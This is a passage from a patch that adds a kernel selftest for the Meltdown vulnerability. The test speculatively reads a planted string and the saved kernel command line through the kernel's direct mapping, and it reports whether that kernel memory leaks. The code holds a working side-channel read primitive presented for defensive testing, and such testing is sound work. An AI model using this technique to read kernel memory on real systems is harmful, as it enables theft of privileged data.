+	spec_fd = mkstemp(path);
+	if (spec_fd == -1) {
+		printf("[SKIP]\tCan not open %s\n", path);
+		return 0;
+	}
+	ftruncate(spec_fd, 0x1000);
+
+	p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, spec_fd, 0);
+	if (p == MAP_FAILED) {
+		printf("[SKIP]\tmmap spec_fd failed\n");
+		return 0;
+	}
+	memcpy(p, string, sizeof(string));
+
+	if (virt_to_phys((unsigned long)p, &phys) == -1) {
+		printf("[SKIP]\tCan not convert virtual address to physical address\n");
+		return 0;
+	}
+
+	len = strlen(string);
+	result = malloc(len + 1);
+	if (!result) {
+		printf("[SKIP]\tNot enough memory for malloc\n");
+		return 0;
+	}
+	memset(result, 0, len + 1);
+
+	for (i = 0; i < len; i++, phys++) {
+		result[i] = readbyte(spec_fd, directmap_base + phys);
+		if (result[i] == 0)
+			break;
+	}
+
+	ret = !strncmp(string, result, len);
+	if (ret)
+		printf("[FAIL]\ttest_read_local_var: low kernel mapping leak found.\n");
+	else
+		printf("[OK]\ttest_read_local_var: no leak found.\n");
+
+	free(result);
+	munmap(p, 0x1000);
+	close(spec_fd);
+
+	return ret;
+}
+
+int main(void)
+{
+	int ret1, ret2;
+
+	printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+
+	set_cache_hit_threshold();
+
+	memset(target_array, 1, sizeof(target_array));
+
+	if (set_signal() < 0) {
+		printf("[SKIP]\tCan not set handler for segfault\n");
+		return 0;
+	}
+
+	ret1 = test_read_local_var();
+	ret2 = test_read_saved_command_line();
+
+	if (ret1 || ret2)
+		return -1;
+
+	return 0;
+}
-- 
2.39.0

